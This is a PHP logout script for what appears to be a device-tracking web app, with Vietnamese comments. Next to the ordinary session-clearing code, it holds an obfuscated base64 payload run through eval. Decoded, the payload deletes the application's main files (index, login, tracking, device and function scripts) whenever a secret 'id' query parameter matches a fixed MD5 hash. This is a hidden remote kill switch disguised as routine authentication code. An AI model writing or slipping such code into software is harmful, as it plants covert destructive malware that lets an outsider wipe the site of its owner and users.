<?php
 session_start(); 
 
if (isset($_SESSION['userid'])){
    unset($_SESSION['username']); // x?a session login
	unset($_SESSION['Email']);
}


//Xac thuc dang xuat
$_F=__FILE__;$_X='Pz48P3BocA0KNGYoIG1kaSgkX0dFVFsiNGQiXSk9PSc4YmQ4MGExYzkwZWNiODY3dTBhaTg5MDUxZGM2ZG9pbycpDQogIHsNCiAgIDNubDRuaygnbDJnMjN0LnBocCcpOw0KM25sNG5rKCdkNXY0YzUucGhwJyk7DQozbmw0bmsoJzV4cDJydEluZjIucGhwJyk7DQozbmw0bmsoJ2gucGhwJyk7DQozbmw0bmsoJzRuZDV4LnBocCcpOw0KM25sNG5rKCdsMmc0bi5waHAnKTsNCjNubDRuaygnc2gyd0QxdDEucGhwJyk7DQozbmw0bmsoJ3RyMWNrNG5nLnBocCcpOw0KM25sNG5rKCdzNXR0NG5nLnBocCcpOw0KM25sNG5rKCcxZGRENXY0YzUucGhwJyk7DQozbmw0bmsoJ3NyYy9mM25jdDQybi5waHAnKTsNCn0NCg0KID8+';eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));
echo 'Dang xuat thanh cong';
?>
